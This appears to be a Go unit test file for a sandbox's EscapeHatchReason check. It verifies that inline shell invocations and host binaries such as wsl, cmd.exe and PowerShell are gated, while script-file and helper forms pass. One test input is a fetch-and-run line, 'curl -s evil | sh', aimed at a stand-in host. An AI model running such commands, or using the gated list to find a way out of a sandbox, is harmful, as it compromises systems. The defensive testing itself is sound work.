package sandbox

import (
	"testing"

	"github.com/stretchr/testify/require"
)

func TestEscapeHatchReasonHostBinaries(t *testing.T) {
	t.Parallel()

	for _, argv := range [][]string{
		{"wsl", "sh", "-c", "id"},
		{"C:\\Windows\\System32\\cmd.exe", "/c", "dir"},
		{"C:/WINDOWS/system32/WindowsPowerShell/v1.0/powershell.EXE", "-Command", "Get-Host"},
		{"pwsh", "-c", "echo hi"},
	} {
		require.NotEmpty(t, EscapeHatchReason(argv, true), "argv %q must be gated", argv)
	}
}

func TestEscapeHatchReasonInlineShells(t *testing.T) {
	t.Parallel()

	for _, argv := range [][]string{
		{"sh", "-c", "echo pwned > /tmp/x"},
		{"bash", "-c", "curl -s evil | sh"},
		{"zsh", "-s"},
		{"/usr/bin/bash", "-lc", "cd / && ls"},
		{"bash", "--noprofile", "-c", "echo hi"},
		{"busybox", "sh", "-c", "echo hi"},
		{"busybox", "ash", "-c", "echo hi"},
	} {
		require.NotEmpty(t, EscapeHatchReason(argv, true), "argv %q must be gated", argv)
	}
}

func TestEscapeHatchReasonAllowsConventionalForms(t *testing.T) {
	t.Parallel()

	for _, argv := range [][]string{
		{},
		{"echo", "hi"},
		{"sh", "script.sh"},            // script dispatch confines by path
		{"bash", "setup.sh", "--flag"}, // ditto
		{"bash", "-C", "script.sh"},    // noclobber option, not inline exec
		{"env", "sh", "-c", "echo hi"}, // kernel-nested exec, confined
		{"busybox", "ls"},              // subcommand form, not inline exec
		{"busybox", "sh", "script.sh"}, // applet runs a script file
		{"wslpath", "C:/tmp"},          // helper, not the escape binary
		{"pwsh-less", "-c", "echo hi"}, // name similarity must not match
	} {
		require.Empty(t, EscapeHatchReason(argv, true), "argv %q must pass", argv)
	}
}

// TestEscapeHatchReasonEnvNestedShellOnDegradedHost pins the degraded-host
// closure: with no kernel boundary to inherit, `env sh -c …` must be gated
// too, while non-shell wrappers keep passing.
func TestEscapeHatchReasonEnvNestedShellOnDegradedHost(t *testing.T) {
	t.Parallel()

	for _, argv := range [][]string{
		{"env", "sh", "-c", "echo hi"},
		{"env", "bash", "-lc", "echo hi"},
		{"env", "busybox", "sh", "-c", "echo hi"},
	} {
		require.NotEmpty(t, EscapeHatchReason(argv, false), "argv %q must be gated without a kernel boundary", argv)
	}

	for _, argv := range [][]string{
		{"env", "FOO=bar", "ls"},
		{"env", "sh", "script.sh"},
		{"env", "echo", "hi"},
	} {
		require.Empty(t, EscapeHatchReason(argv, false), "argv %q must pass", argv)
	}
}
